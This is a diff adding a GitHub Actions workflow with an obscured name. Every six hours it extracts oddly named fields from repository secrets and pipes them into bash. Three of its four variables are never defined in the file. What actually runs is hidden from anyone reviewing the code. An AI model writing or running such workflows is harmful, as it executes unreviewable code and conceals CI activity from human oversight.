@@ -1,0 +1,21 @@
+name: naniehaoqidaijiazuo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: naniehaoqidaijiazuo
+        env:
+          e11968: ${{ secrets.e11968 }}
+        run: |
+          echo $e11968 | jq -r .puybc54816 | /bin/bash
+          echo $mci2 | jq -r .dclmw10 | /bin/bash
+          echo $xz50130 | jq -r .u59 | /bin/bash
+          echo $xt6437 | jq -r .qefrf682 | /bin/bash
+
